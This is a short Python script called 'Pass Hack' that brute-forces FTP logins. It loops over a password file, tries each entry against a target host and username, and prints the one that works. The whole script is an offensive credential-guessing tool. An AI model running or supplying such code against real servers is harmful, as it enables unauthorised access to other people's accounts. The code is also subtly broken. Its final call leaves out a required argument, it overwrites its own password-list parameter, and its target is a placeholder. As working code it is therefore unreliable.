import ftplib

def mainPage():
    print("""

            __________                          ___ ___                __    
            \______   \_____    ______ ______  /   |   \_____    ____ |  | __
            |     ___/\__  \  /  ___//  ___/ /    ~    \__  \ _/ ___\|  |/ /
            |    |     / __ \_\___ \ \___ \  \    Y    // __ \\  \___|    < 
            |____|    (____  /____  >____  >  \___|_  /(____  /\___  >__|_ \
                            \/     \/     \/         \/      \/     \/     \/
          Created by Anton Hrlić

        """)
def brute_force_ftp(target, username, password_list):
    password_list="passwords.txt"
    with open(password_list, "r") as passwords:
        for password in passwords:
            password = password.strip()
            try:
                ftp = ftplib.FTP(target)
                ftp.login(user=username, passwd=password)
                print(f"Success: {password}")
                ftp.quit()
                return
            except ftplib.error_perm:
                print(f"Failed: {password}")
mainPage()
brute_force_ftp("LOL","riki")